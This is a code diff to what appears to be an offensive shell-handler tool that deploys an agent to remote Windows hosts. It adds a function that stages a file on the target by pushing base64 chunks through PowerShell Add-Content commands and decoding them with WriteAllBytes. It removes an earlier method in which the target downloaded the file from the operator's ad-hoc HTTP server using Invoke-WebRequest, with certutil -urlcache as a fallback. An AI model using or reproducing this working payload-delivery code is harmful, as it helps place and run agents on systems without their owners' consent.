@@ -5,6 +5,7 @@ and executes the agent in reverse (client) or bind (server) mode as a background
 """
 
 import argparse
+import base64
 import gzip
 import os
 import shutil
@@ -228,6 +229,88 @@ def _kill_and_remove_remote(session, remote_path, shell_type):
         time.sleep(1.0)
         handler.recv_output(sock, timeout=2.0)
 
+def _stage_windows_via_lines(session, local_path, remote_path):
+    handler = session._handler
+    sock = session._client_sock
+
+    try:
+        with open(local_path, 'rb') as f:
+            content = f.read()
+    except OSError as e:
+        session.print(f"Failed to read local file: {e}", 'red')
+        return False
+
+    total = len(content)
+    esc_path = remote_path.replace("'", "''")
+    b64_path = remote_path + '.b64'
+    esc_b64 = b64_path.replace("'", "''")
+
+    if total == 0:
+        handler._send_win_ps(sock, f"[IO.File]::WriteAllBytes('{esc_path}', @())")
+        handler.recv_output(sock, timeout=10.0)
+        return True
+
+    b64_data = base64.b64encode(content).decode('ascii')
+    LINE = 384
+    BATCH = 6
+
+    handler._send_win_ps(sock, (
+        f"Remove-Item -LiteralPath '{esc_b64}' -Force -EA 0; "
+        f"New-Item -ItemType File -Path '{esc_b64}' -Force | Out-Null; "
+        f"Write-Output 'RESET_OK'"
+    ))
+    handler.recv_output(sock, timeout=10.0)
+
+    lines = [b64_data[i:i + LINE] for i in range(0, len(b64_data), LINE)]
+    total_batches = (len(lines) + BATCH - 1) // BATCH
+    start = time.time()
+
+    session.print(f"Uploading via line-based staging: {_format_size(total)}", 'yellow')
+
+    for batch_idx in range(total_batches):
+        group = lines[batch_idx * BATCH:(batch_idx + 1) * BATCH]
+        script = '; '.join(
+            f"Add-Content -LiteralPath '{esc_b64}' -Value '{c}' -EA 0"
+            for c in group
+        )
+        handler._send_win_ps(sock, script)
+        handler.recv_output(sock, timeout=30.0)
+
+        if total > 64 * 1024 and ((batch_idx + 1) % 4 == 0 or batch_idx + 1 == total_batches):
+            bytes_sent = min(len(b64_data), (batch_idx + 1) * BATCH * LINE)
+            raw_sent = int(bytes_sent * 3 / 4)
+            elapsed = max(time.time() - start, 0.001)
+            speed = raw_sent / elapsed
+            pct = int(100 * raw_sent / total)
+            bar = '#' * (pct // 2) + '-' * (50 - pct // 2)
+            print(f"\r[{bar}] {pct}% {_format_size(raw_sent)}/{_format_size(total)} @ {_format_size(speed)}/s", end='')
+
+    decode_ps = (
+        f"$raw = Get-Content -Raw -LiteralPath '{esc_b64}' -EA 0; "
+        f"if (-not $raw) {{ Write-Output 'DECODE_FAIL:empty' }} else {{ "
+        f"  $clean = $raw -replace '\\s', ''; "
+        f"  try {{ "
+        f"    $bytes = [Convert]::FromBase64String($clean); "
+        f"    [IO.File]::WriteAllBytes('{esc_path}', $bytes); "
+        f"    Remove-Item -LiteralPath '{esc_b64}' -Force -EA 0; "
+        f"    Write-Output 'DECODE_OK' "
+        f"  }} catch {{ Write-Output ('DECODE_FAIL:' + $_.Exception.Message) }} "
+        f"}}"
+    )
+    handler._send_win_ps(sock, decode_ps)
+    out = handler.recv_output(sock, timeout=180.0) or ''
+
+    if total > 64 * 1024:
+        print()
+
+    if 'DECODE_OK' not in out:
+        session.print(f"Decode failed on target: {out[:300]}", 'red')
+        handler._send_win_ps(sock, f"Remove-Item -LiteralPath '{esc_b64}' -Force -EA 0")
+        handler.recv_output(sock, timeout=10.0)
+        return False
+
+    return True
+
 def _upload_file(session, local_path, remote_path, resume=False):
     handler = session._handler
     sock = session._client_sock
@@ -250,93 +333,7 @@ def _upload_file(session, local_path, remote_path, resume=False):
         if resume:
             session.print("Resume not supported for Windows uploads – performing full upload.", 'yellow')
 
-        try:
-            with open(local_path, 'rb') as f:
-                content = f.read()
-        except Exception as e:
-            session.print(f"Failed to read local file: {e}", 'red')
-            return False
-
-        class AgentHandler(SimpleHTTPRequestHandler):
-            def do_GET(self):
-                parsed = urllib.parse.urlparse(self.path)
-                if parsed.path == '/file':
-                    self.send_response(200)
-                    self.send_header('Content-Type', 'application/octet-stream')
-                    self.send_header('Content-Length', str(len(content)))
-                    self.end_headers()
-                    self.wfile.write(content)
-                else:
-                    self.send_response(404)
-                    self.end_headers()
-            def log_message(self, fmt, *args):
-                pass
-
-        class ReusableTCPServer(socketserver.TCPServer):
-            allow_reuse_address = True
-
-        server = None
-        try:
-            server = ReusableTCPServer(('0.0.0.0', 0), AgentHandler)
-            port = server.server_address[1]
-        except Exception as e:
-            session.print(f"Failed to start HTTP server: {e}", 'red')
-            return False
-
-        stop_event = threading.Event()
-        def serve():
-            while not stop_event.is_set():
-                server.handle_request()
-            server.server_close()
-
-        thread = threading.Thread(target=serve, daemon=True)
-        thread.start()
-
-        handler_ip = sock.getsockname()[0]
-        url = f"http://{handler_ip}:{port}/file"
-        escaped = remote_path.replace("'", "''")
-        ps_cmd = (
-            f"$ErrorActionPreference='Stop'; "
-            f"try {{ Invoke-WebRequest -Uri '{url}' -OutFile '{escaped}' -UseBasicParsing -ErrorAction Stop; "
-            f"Write-Output '{PLUGIN_MARK_START}OK{PLUGIN_MARK_END}' }} "
-            f"catch {{ certutil -urlcache -f '{url}' '{escaped}' 2>$null; "
-            f"if ($?) {{ Write-Output '{PLUGIN_MARK_START}OK{PLUGIN_MARK_END}' }} "
-            f"else {{ Write-Output '{PLUGIN_MARK_START}FAIL{PLUGIN_MARK_END}' }} }}"
-        )
-
-        session.print(f"Uploading via HTTP: {_format_size(total)}", 'yellow')
-        handler._flush_shell(sock, timeout=1.0)
-        sock.sendall((ps_cmd + '\n').encode())
-
-        start = time.time()
-        output = b''
-        marker_start = PLUGIN_MARK_START.encode()
-        marker_end = PLUGIN_MARK_END.encode()
-        while time.time() - start < 60.0:
-            try:
-                chunk = sock.recv(4096)
-                if not chunk:
-                    break
-                output += chunk
-                if marker_start in output and marker_end in output:
-                    break
-            except Exception:
-                break
-
-        stop_event.set()
-        thread.join(timeout=2.0)
-
-        result = None
-        try:
-            si = output.find(marker_start) + len(marker_start)
-            ei = output.find(marker_end, si)
-            if si != -1 and ei != -1:
-                result = output[si:ei].decode().strip()
-        except Exception:
-            pass
-
-        if result != 'OK':
-            session.print("Windows upload failed.", 'red')
+        if not _stage_windows_via_lines(session, local_path, remote_path):
             return False
 
         print(f"{colors['yellow']}Verifying integrity...{colors['end']}", end='', flush=True)
